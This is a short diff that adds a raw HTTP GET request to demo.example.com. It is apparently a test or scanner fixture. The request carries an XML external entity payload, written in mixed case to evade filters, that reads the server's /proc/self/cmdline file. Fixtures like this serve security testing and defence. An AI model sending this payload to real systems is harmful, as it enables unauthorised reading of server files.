@@ -1,0 +1,4 @@
+GET /a?path=<!dOcTyPe%20R%20[<!eNtItY%20xXe%20SyStEm%20"FiLe:///PrOc/SeLf/CmDlInE">]><r>%26XxE;</r> HTTP/1.1
+Host: demo.example.com
+Connection: close
+
